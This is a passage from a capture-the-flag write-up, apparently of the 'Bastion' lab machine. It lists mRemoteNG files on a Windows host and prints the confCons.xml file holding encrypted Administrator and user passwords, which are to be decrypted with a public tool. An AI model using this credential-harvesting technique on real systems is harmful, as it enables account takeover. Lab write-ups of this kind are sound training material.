23-02-2019  10:38    &lt;DIR&gt;          Internet Explorer                                                          
16-07-2016  15:23    &lt;DIR&gt;          Microsoft.NET                                                              
22-02-2019  15:01    &lt;DIR&gt;          mRemoteNG                                                                  
23-02-2019  11:22    &lt;DIR&gt;          Windows Defender                                                           
23-02-2019  10:38    &lt;DIR&gt;          Windows Mail                                                               
23-02-2019  11:22    &lt;DIR&gt;          Windows Media Player                                                       
16-07-2016  15:23    &lt;DIR&gt;          Windows Multimedia Platform                                                
16-07-2016  15:23    &lt;DIR&gt;          Windows NT                                                                 
23-02-2019  11:22    &lt;DIR&gt;          Windows Photo Viewer                                                       
16-07-2016  15:23    &lt;DIR&gt;          Windows Portable Devices                                                   
16-07-2016  15:23    &lt;DIR&gt;          WindowsPowerShell                                                          
               0 File<span class="o">(</span>s<span class="o">)</span>              0 bytes                                                                  
              14 Dir<span class="o">(</span>s<span class="o">)</span>  11.404.402.688 bytes free     

</pre></td>
</tr></tbody></table></code></div></div>
<p><code class="language-plaintext highlighter-rouge">mRemoteNG</code> ? This doesn’t seem like a default installed Windows program.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">dir </span>C:<span class="se">\P</span>rogram Files <span class="o">(</span>x86<span class="o">)</span><span class="se">\m</span>RemoteNG
 Volume <span class="k">in </span>drive C has no label.                                                 
 Volume Serial Number is 0CB3-C487                                               

 Directory of C:<span class="se">\P</span>rogram Files <span class="o">(</span>x86<span class="o">)</span><span class="se">\m</span>RemoteNG                                   

22-02-2019  15:01    &lt;DIR&gt;          <span class="nb">.</span>                                            
22-02-2019  15:01    &lt;DIR&gt;          ..                                           
18-10-2018  23:31            36.208 ADTree.dll                                   
18-10-2018  23:31           346.992 AxInterop.MSTSCLib.dll                       
18-10-2018  23:31            83.824 AxInterop.WFICALib.dll                       
18-10-2018  23:31         2.243.440 BouncyCastle.Crypto.dll                      
18-10-2018  23:30            71.022 Changelog.txt                                
18-10-2018  23:30             3.224 Credits.txt                                  
22-02-2019  15:01    &lt;DIR&gt;          cs-CZ                                        
22-02-2019  15:01    &lt;DIR&gt;          de                                           
22-02-2019  15:01    &lt;DIR&gt;          el                                           
22-02-2019  15:01    &lt;DIR&gt;          en-US                                        
22-02-2019  15:01    &lt;DIR&gt;          es                                           
22-02-2019  15:01    &lt;DIR&gt;          es-AR                                        
22-02-2019  15:01    &lt;DIR&gt;          Firefox                                      
22-02-2019  15:01    &lt;DIR&gt;          fr                                           
18-10-2018  23:31         1.966.960 Geckofx-Core.dll                             
05-07-2017  01:31         4.482.560 Geckofx-Core.pdb                             
18-10-2018  23:31           143.728 Geckofx-Winforms.dll                         
05-07-2017  01:31           259.584 Geckofx-Winforms.pdb                         
22-02-2019  15:01    &lt;DIR&gt;          Help                                         
22-02-2019  15:01    &lt;DIR&gt;          hu                                           
22-02-2019  15:01    &lt;DIR&gt;          Icons                                        
18-10-2018  23:31           607.088 Interop.MSTSCLib.dll                         
18-10-2018  23:31           131.440 Interop.WFICALib.dll                         
22-02-2019  15:01    &lt;DIR&gt;          it                                           
22-02-2019  15:01    &lt;DIR&gt;          ja-JP                                        
22-02-2019  15:01    &lt;DIR&gt;          ko-KR                                        
07-10-2018  13:21            18.326 License.txt                                  
18-10-2018  23:31           283.504 log4net.dll                                  
18-10-2018  23:31           412.528 MagicLibrary.dll                             
18-10-2018  23:31         1.552.240 mRemoteNG.exe                                
07-10-2018  13:21            28.317 mRemoteNG.exe.config                         
18-10-2018  23:30         2.405.888 mRemoteNG.pdb                                
22-02-2019  15:01    &lt;DIR&gt;          nb-NO                                        
22-02-2019  15:01    &lt;DIR&gt;          <span class="nb">nl                                           
</span>18-10-2018  23:31           451.952 ObjectListView.dll                           
22-02-2019  15:01    &lt;DIR&gt;          pl                                           
22-02-2019  15:01    &lt;DIR&gt;          pt                                           
22-02-2019  15:01    &lt;DIR&gt;          pt-BR                                        
07-10-2018  13:21           707.952 PuTTYNG.exe                                  
07-10-2018  13:21               887 Readme.txt                                   
18-10-2018  23:31           415.088 Renci.SshNet.dll                             
22-02-2019  15:01    &lt;DIR&gt;          ru                                           
22-02-2019  15:01    &lt;DIR&gt;          Schemas                                      
22-02-2019  15:01    &lt;DIR&gt;          Themes                                       
22-02-2019  15:01    &lt;DIR&gt;          tr-TR                                        
22-02-2019  15:01    &lt;DIR&gt;          uk                                           
18-10-2018  23:31           152.432 VncSharp.dll                                 
18-10-2018  23:31           312.176 WeifenLuo.WinFormsUI.Docking.dll             
18-10-2018  23:31            55.152 WeifenLuo.WinFormsUI.Docking.ThemeVS2003.dll 
18-10-2018  23:31           168.816 WeifenLuo.WinFormsUI.Docking.ThemeVS2012.dll 
18-10-2018  23:31           217.968 WeifenLuo.WinFormsUI.Docking.ThemeVS2013.dll 
18-10-2018  23:31           243.056 WeifenLuo.WinFormsUI.Docking.ThemeVS2015.dll 
22-02-2019  15:01    &lt;DIR&gt;          zh-CN                                        
22-02-2019  15:01    &lt;DIR&gt;          zh-TW                                        
              28 File<span class="o">(</span>s<span class="o">)</span>     17.802.352 bytes                                    
              28 Dir<span class="o">(</span>s<span class="o">)</span>  11.360.325.632 bytes free                               
</pre></td>
</tr></tbody></table></code></div></div>
<p>Lets see what version of <code class="language-plaintext highlighter-rouge">mRemoteNG</code> is installed by checking the <code class="language-plaintext highlighter-rouge">Changelog.txt</code>.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td>
<td class="rouge-code"><pre>1.76.11 <span class="o">(</span>2018-10-18<span class="o">)</span>:                                                            

Fixes:                                                                           
<span class="nt">------</span>                                                                           
<span class="c">#1139: Feature "Reconnect to previously opened sessions" not working             </span>
<span class="c">#1136: Putty window not maximized                                                </span>

...
</pre></td>
</tr></tbody></table></code></div></div>
<p>Seems like the version is <code class="language-plaintext highlighter-rouge">1.76.10</code>. Lets see if we can find any exploits regarding <code class="language-plaintext highlighter-rouge">mRemoteNG</code>.</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/bastion3.png" alt=""></p>
<p>I came across this <a href="https://www.rapid7.com/db/modules/post/windows/gather/credentials/mremote">post-exploitation module</a> for Metasploit that harvests the credentials from mRemoteNG’s password storage file. Since I did not have meterpreter session on the machine, I found some other <a href="https://github.com/kmahyyg/mremoteng-decrypt/">alternative</a>.</p>
<p>The password storage file was stored in the <code class="language-plaintext highlighter-rouge">%appdata%\mRemoteNG</code>.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">dir</span> %appdata%<span class="se">\m</span>RemoteNG 

22-02-2019  15:03    &lt;DIR&gt;          <span class="nb">.</span>                                                                          
22-02-2019  15:03    &lt;DIR&gt;          ..                                                                         
22-02-2019  15:03             6.316 confCons.xml                                                               
22-02-2019  15:02             6.194 confCons.xml.20190222-1402277353.backup                                    
22-02-2019  15:02             6.206 confCons.xml.20190222-1402339071.backup                                    
22-02-2019  15:02             6.218 confCons.xml.20190222-1402379227.backup                                    
22-02-2019  15:02             6.231 confCons.xml.20190222-1403070644.backup                                    
22-02-2019  15:03             6.319 confCons.xml.20190222-1403100488.backup                                    
22-02-2019  15:03             6.318 confCons.xml.20190222-1403220026.backup                                    
22-02-2019  15:03             6.315 confCons.xml.20190222-1403261268.backup                                    
22-02-2019  15:03             6.316 confCons.xml.20190222-1403272831.backup                                    
22-02-2019  15:03             6.315 confCons.xml.20190222-1403433299.backup                                    
22-02-2019  15:03             6.316 confCons.xml.20190222-1403486580.backup                                    
22-02-2019  15:03                51 extApps.xml                                                                
17-08-2019  15:56             6.370 mRemoteNG.log                                                              
22-02-2019  15:03             2.245 pnlLayout.xml                                                              
22-02-2019  15:01    &lt;DIR&gt;          Themes                                                                     
              14 File<span class="o">(</span>s<span class="o">)</span>         77.730 bytes                                                                  
               3 Dir<span class="o">(</span>s<span class="o">)</span>  11.404.337.152 bytes free 

<span class="nv">$ </span>more %appdata%<span class="se">\m</span>RemoteNG<span class="se">\c</span>onfCons.xml
&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"utf-8"</span>?&gt;                                                                         
&lt;mrng:Connections xmlns:mrng<span class="o">=</span><span class="s2">"http://mremoteng.org"</span> <span class="nv">Name</span><span class="o">=</span><span class="s2">"Connections"</span> <span class="nv">Export</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">EncryptionEngine</span><span class="o">=</span><span class="s2">"AES"</span> Bl
<span class="nv">ockCipherMode</span><span class="o">=</span><span class="s2">"GCM"</span> <span class="nv">KdfIterations</span><span class="o">=</span><span class="s2">"1000"</span> <span class="nv">FullFileEncryption</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">Protected</span><span class="o">=</span><span class="s2">"ZSvKI7j224Gf/twXpaP5G2QFZMLr1iO1
f5JKdtIKL6eUg+eWkL5tKO886au0ofFPW0oop8R8ddXKAx4KK7sAk6AA"</span> <span class="nv">ConfVersion</span><span class="o">=</span><span class="s2">"2.6"</span><span class="o">&gt;</span>                                   
    &lt;Node <span class="nv">Name</span><span class="o">=</span><span class="s2">"DC"</span> <span class="nv">Type</span><span class="o">=</span><span class="s2">"Connection"</span> <span class="nv">Descr</span><span class="o">=</span><span class="s2">""</span> <span class="nv">Icon</span><span class="o">=</span><span class="s2">"mRemoteNG"</span> <span class="nv">Panel</span><span class="o">=</span><span class="s2">"General"</span> <span class="nv">Id</span><span class="o">=</span><span class="s2">"500e7d58-662a-44d4-aff0-3a4
f547a3fee"</span> <span class="nv">Username</span><span class="o">=</span><span class="s2">"Administrator"</span> <span class="nv">Domain</span><span class="o">=</span><span class="s2">""</span> <span class="nv">Password</span><span class="o">=</span><span class="s2">"aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xD
qE4HdVmHAowVRdC7emf7lWWA10dQKiw=="</span> <span class="nv">Hostname</span><span class="o">=</span><span class="s2">"127.0.0.1"</span> <span class="nv">Protocol</span><span class="o">=</span><span class="s2">"RDP"</span> <span class="nv">PuttySession</span><span class="o">=</span><span class="s2">"Default Settings"</span> <span class="nv">Port</span><span class="o">=</span><span class="s2">"33
89"</span> <span class="nv">ConnectToConsole</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">UseCredSsp</span><span class="o">=</span><span class="s2">"true"</span> <span class="nv">RenderingEngine</span><span class="o">=</span><span class="s2">"IE"</span> <span class="nv">ICAEncryptionStrength</span><span class="o">=</span><span class="s2">"EncrBasic"</span> RDPAuthen
<span class="nv">ticationLevel</span><span class="o">=</span><span class="s2">"NoAuth"</span> <span class="nv">RDPMinutesToIdleTimeout</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">RDPAlertIdleTimeout</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">LoadBalanceInfo</span><span class="o">=</span><span class="s2">""</span> <span class="nv">Colors</span><span class="o">=</span><span class="s2">"Color
s16Bit"</span> <span class="nv">Resolution</span><span class="o">=</span><span class="s2">"FitToWindow"</span> <span class="nv">AutomaticResize</span><span class="o">=</span><span class="s2">"true"</span> <span class="nv">DisplayWallpaper</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">DisplayThemes</span><span class="o">=</span><span class="s2">"false"</span> EnableFo
<span class="nv">ntSmoothing</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">EnableDesktopComposition</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">CacheBitmaps</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">RedirectDiskDrives</span><span class="o">=</span><span class="s2">"false"</span> RedirectPo
<span class="nv">rts</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">RedirectPrinters</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">RedirectSmartCards</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">RedirectSound</span><span class="o">=</span><span class="s2">"DoNotPlay"</span> <span class="nv">SoundQuality</span><span class="o">=</span><span class="s2">"Dynamic
"</span> <span class="nv">RedirectKeys</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">Connected</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">PreExtApp</span><span class="o">=</span><span class="s2">""</span> <span class="nv">PostExtApp</span><span class="o">=</span><span class="s2">""</span> <span class="nv">MacAddress</span><span class="o">=</span><span class="s2">""</span> <span class="nv">UserField</span><span class="o">=</span><span class="s2">""</span> <span class="nv">ExtApp</span><span class="o">=</span><span class="s2">""</span> VNCCom
<span class="nv">pression</span><span class="o">=</span><span class="s2">"CompNone"</span> <span class="nv">VNCEncoding</span><span class="o">=</span><span class="s2">"EncHextile"</span> <span class="nv">VNCAuthMode</span><span class="o">=</span><span class="s2">"AuthVNC"</span> <span class="nv">VNCProxyType</span><span class="o">=</span><span class="s2">"ProxyNone"</span> <span class="nv">VNCProxyIP</span><span class="o">=</span><span class="s2">""</span> VNCPr
<span class="nv">oxyPort</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">VNCProxyUsername</span><span class="o">=</span><span class="s2">""</span> <span class="nv">VNCProxyPassword</span><span class="o">=</span><span class="s2">""</span> <span class="nv">VNCColors</span><span class="o">=</span><span class="s2">"ColNormal"</span> <span class="nv">VNCSmartSizeMode</span><span class="o">=</span><span class="s2">"SmartSAspect"</span> VNCVi
<span class="nv">ewOnly</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">RDGatewayUsageMethod</span><span class="o">=</span><span class="s2">"Never"</span> <span class="nv">RDGatewayHostname</span><span class="o">=</span><span class="s2">""</span> <span class="nv">RDGatewayUseConnectionCredentials</span><span class="o">=</span><span class="s2">"Yes"</span> RDGate
<span class="nv">wayUsername</span><span class="o">=</span><span class="s2">""</span> <span class="nv">RDGatewayPassword</span><span class="o">=</span><span class="s2">""</span> <span class="nv">RDGatewayDomain</span><span class="o">=</span><span class="s2">""</span> <span class="nv">InheritCacheBitmaps</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritColors</span><span class="o">=</span><span class="s2">"false"</span> Inheri
<span class="nv">tDescription</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritDisplayThemes</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritDisplayWallpaper</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritEnableFontSmoothing</span><span class="o">=</span><span class="s2">"f
alse"</span> <span class="nv">InheritEnableDesktopComposition</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritDomain</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritIcon</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritPanel</span><span class="o">=</span><span class="s2">"false"</span> In
<span class="nv">heritPassword</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritPort</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritProtocol</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritPuttySession</span><span class="o">=</span><span class="s2">"false"</span> InheritRedirectDi
<span class="nv">skDrives</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRedirectKeys</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRedirectPorts</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRedirectPrinters</span><span class="o">=</span><span class="s2">"false"</span> Inher
<span class="nv">itRedirectSmartCards</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRedirectSound</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritSoundQuality</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritResolution</span><span class="o">=</span><span class="s2">"false"</span>
 <span class="nv">InheritAutomaticResize</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritUseConsoleSession</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritUseCredSsp</span><span class="o">=</span><span class="s2">"false"</span> InheritRenderingEngi
<span class="nv">ne</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritUsername</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritICAEncryptionStrength</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRDPAuthenticationLevel</span><span class="o">=</span><span class="s2">"false"</span> I
<span class="nv">nheritRDPMinutesToIdleTimeout</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRDPAlertIdleTimeout</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritLoadBalanceInfo</span><span class="o">=</span><span class="s2">"false"</span> Inherit
<span class="nv">PreExtApp</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritPostExtApp</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritMacAddress</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritUserField</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritExtApp</span><span class="o">=</span><span class="s2">"f
alse"</span> <span class="nv">InheritVNCCompression</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritVNCEncoding</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritVNCAuthMode</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritVNCProxyType</span><span class="o">=</span><span class="s2">"
false"</span> <span class="nv">InheritVNCProxyIP</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritVNCProxyPort</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritVNCProxyUsername</span><span class="o">=</span><span class="s2">"false"</span> InheritVNCProxyPas
<span class="nv">sword</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritVNCColors</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritVNCSmartSizeMode</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritVNCViewOnly</span><span class="o">=</span><span class="s2">"false"</span> InheritRDGate
<span class="nv">wayUsageMethod</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRDGatewayHostname</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRDGatewayUseConnectionCredentials</span><span class="o">=</span><span class="s2">"false"</span> Inheri
<span class="nv">tRDGatewayUsername</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRDGatewayPassword</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRDGatewayDomain</span><span class="o">=</span><span class="s2">"false"</span> /&gt;                  
    &lt;Node <span class="nv">Name</span><span class="o">=</span><span class="s2">"L4mpje-PC"</span> <span class="nv">Type</span><span class="o">=</span><span class="s2">"Connection"</span> <span class="nv">Descr</span><span class="o">=</span><span class="s2">""</span> <span class="nv">Icon</span><span class="o">=</span><span class="s2">"mRemoteNG"</span> <span class="nv">Panel</span><span class="o">=</span><span class="s2">"General"</span> <span class="nv">Id</span><span class="o">=</span><span class="s2">"8d3579b2-e68e-48c1-8
f0f-9ee1347c9128"</span> <span class="nv">Username</span><span class="o">=</span><span class="s2">"L4mpje"</span> <span class="nv">Domain</span><span class="o">=</span><span class="s2">""</span> <span class="nv">Password</span><span class="o">=</span><span class="s2">"yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U
9fKRylI7NcB9QuRsZVvla8esB"</span> <span class="nv">Hostname</span><span class="o">=</span><span class="s2">"192.168.1.75"</span> <span class="nv">Protocol</span><span class="o">=</span><span class="s2">"RDP"</span> <span class="nv">PuttySession</span><span class="o">=</span><span class="s2">"Default Settings"</span> <span class="nv">Port</span><span class="o">=</span><span class="s2">"3389"</span> C
<span class="nv">onnectToConsole</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">UseCredSsp</span><span class="o">=</span><span class="s2">"true"</span> <span class="nv">RenderingEngine</span><span class="o">=</span><span class="s2">"IE"</span> <span class="nv">ICAEncryptionStrength</span><span class="o">=</span><span class="s2">"EncrBasic"</span> RDPAuthenticat
<span class="nv">ionLevel</span><span class="o">=</span><span class="s2">"NoAuth"</span> <span class="nv">RDPMinutesToIdleTimeout</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">RDPAlertIdleTimeout</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">LoadBalanceInfo</span><span class="o">=</span><span class="s2">""</span> <span class="nv">Colors</span><span class="o">=</span><span class="s2">"Colors16Bi
t"</span> <span class="nv">Resolution</span><span class="o">=</span><span class="s2">"FitToWindow"</span> <span class="nv">AutomaticResize</span><span class="o">=</span><span class="s2">"true"</span> <span class="nv">DisplayWallpaper</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">DisplayThemes</span><span class="o">=</span><span class="s2">"false"</span> EnableFontSmo
<span class="nv">othing</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">EnableDesktopComposition</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">CacheBitmaps</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">RedirectDiskDrives</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">RedirectPorts</span><span class="o">=</span><span class="s2">"
false"</span> <span class="nv">RedirectPrinters</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">RedirectSmartCards</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">RedirectSound</span><span class="o">=</span><span class="s2">"DoNotPlay"</span> <span class="nv">SoundQuality</span><span class="o">=</span><span class="s2">"Dynamic"</span> Red
<span class="nv">irectKeys</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">Connected</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">PreExtApp</span><span class="o">=</span><span class="s2">""</span> <span class="nv">PostExtApp</span><span class="o">=</span><span class="s2">""</span> <span class="nv">MacAddress</span><span class="o">=</span><span class="s2">""</span> <span class="nv">UserField</span><span class="o">=</span><span class="s2">""</span> <span class="nv">ExtApp</span><span class="o">=</span><span class="s2">""</span> VNCCompress
<span class="nv">ion</span><span class="o">=</span><span class="s2">"CompNone"</span> <span class="nv">VNCEncoding</span><span class="o">=</span><span class="s2">"EncHextile"</span> <span class="nv">VNCAuthMode</span><span class="o">=</span><span class="s2">"AuthVNC"</span> <span class="nv">VNCProxyType</span><span class="o">=</span><span class="s2">"ProxyNone"</span> <span class="nv">VNCProxyIP</span><span class="o">=</span><span class="s2">""</span> VNCProxyPo
<span class="nv">rt</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">VNCProxyUsername</span><span class="o">=</span><span class="s2">""</span> <span class="nv">VNCProxyPassword</span><span class="o">=</span><span class="s2">""</span> <span class="nv">VNCColors</span><span class="o">=</span><span class="s2">"ColNormal"</span> <span class="nv">VNCSmartSizeMode</span><span class="o">=</span><span class="s2">"SmartSAspect"</span> VNCViewOnl
<span class="nv">y</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">RDGatewayUsageMethod</span><span class="o">=</span><span class="s2">"Never"</span> <span class="nv">RDGatewayHostname</span><span class="o">=</span><span class="s2">""</span> <span class="nv">RDGatewayUseConnectionCredentials</span><span class="o">=</span><span class="s2">"Yes"</span> RDGatewayUs
<span class="nv">ername</span><span class="o">=</span><span class="s2">""</span> <span class="nv">RDGatewayPassword</span><span class="o">=</span><span class="s2">""</span> <span class="nv">RDGatewayDomain</span><span class="o">=</span><span class="s2">""</span> <span class="nv">InheritCacheBitmaps</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritColors</span><span class="o">=</span><span class="s2">"false"</span> InheritDesc
<span class="nv">ription</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritDisplayThemes</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritDisplayWallpaper</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritEnableFontSmoothing</span><span class="o">=</span><span class="s2">"false"</span>
 <span class="nv">InheritEnableDesktopComposition</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritDomain</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritIcon</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritPanel</span><span class="o">=</span><span class="s2">"false"</span> Inherit
<span class="nv">Password</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritPort</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritProtocol</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritPuttySession</span><span class="o">=</span><span class="s2">"false"</span> InheritRedirectDiskDri
<span class="nv">ves</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRedirectKeys</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRedirectPorts</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRedirectPrinters</span><span class="o">=</span><span class="s2">"false"</span> InheritRed
<span class="nv">irectSmartCards</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRedirectSound</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritSoundQuality</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritResolution</span><span class="o">=</span><span class="s2">"false"</span> Inhe
<span class="nv">ritAutomaticResize</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritUseConsoleSession</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritUseCredSsp</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRenderingEngine</span><span class="o">=</span><span class="s2">"f
alse"</span> <span class="nv">InheritUsername</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritICAEncryptionStrength</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRDPAuthenticationLevel</span><span class="o">=</span><span class="s2">"false"</span> Inheri
<span class="nv">tRDPMinutesToIdleTimeout</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRDPAlertIdleTimeout</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritLoadBalanceInfo</span><span class="o">=</span><span class="s2">"false"</span> InheritPreEx
<span class="nv">tApp</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritPostExtApp</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritMacAddress</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritUserField</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritExtApp</span><span class="o">=</span><span class="s2">"false"</span>
 <span class="nv">InheritVNCCompression</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritVNCEncoding</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritVNCAuthMode</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritVNCProxyType</span><span class="o">=</span><span class="s2">"false
"</span> <span class="nv">InheritVNCProxyIP</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritVNCProxyPort</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritVNCProxyUsername</span><span class="o">=</span><span class="s2">"false"</span> InheritVNCProxyPassword
<span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritVNCColors</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritVNCSmartSizeMode</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritVNCViewOnly</span><span class="o">=</span><span class="s2">"false"</span> InheritRDGatewayUs
<span class="nv">ageMethod</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRDGatewayHostname</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRDGatewayUseConnectionCredentials</span><span class="o">=</span><span class="s2">"false"</span> InheritRDGa
<span class="nv">tewayUsername</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRDGatewayPassword</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">InheritRDGatewayDomain</span><span class="o">=</span><span class="s2">"false"</span> /&gt;                       
&lt;/mrng:Connections&gt; 
</pre></td>
</tr></tbody></table></code></div></div>
<p>In the <code class="language-plaintext highlighter-rouge">&lt;Node&gt;</code> element, we see :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td>
<td class="rouge-code"><pre>username: Administrator  
password: aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==  
hostname: 127.0.0.1  
protocol: RDP
</pre></td>
</tr></tbody></table></code></div></div>
<p>From this, we can guess that the password field contains the encrypted version of the Administrator’s password. Using the <code class="language-plaintext highlighter-rouge">mremoteng_decrypt.py</code>,</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td>
